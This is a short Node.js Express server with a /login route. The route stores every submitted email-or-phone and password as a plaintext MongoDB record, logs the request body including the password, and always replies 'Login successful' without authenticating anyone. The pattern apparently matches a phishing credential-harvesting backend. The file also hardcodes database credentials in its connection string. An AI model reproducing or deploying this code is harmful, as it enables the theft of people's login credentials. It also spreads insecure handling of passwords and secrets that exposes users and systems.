const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public')); // to serve static files like CSS

// Connect to MongoDB
const uri = 'mongodb+srv://<minhazexo>:<minhaz0337>@cluster0.mongodb.net/<project 0>?retryWrites=true&w=majority';
mongoose.connect(uri, { useNewUrlParser: true, useUnifiedTopology: true });

// Define the User schema
const userSchema = new mongoose.Schema({
  emailOrPhone: String,
  password: String
});

const User = mongoose.model('User', userSchema);

// Serve the HTML file
app.get('/', (req, res) => {
  res.sendFile(__dirname + '/index.html');
});

// Handle form submission
app.post('/login', (req, res) => {
  const { emailOrPhone, password } = req.body;

  const newUser = new User({ emailOrPhone, password });

  newUser.save((err) => {
    if (err) {
      console.log(err);
      res.send('Error occurred');
    } else {
      console.log('User logged in:', req.body);
      res.send('Login successful');
    }
  });
});

app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
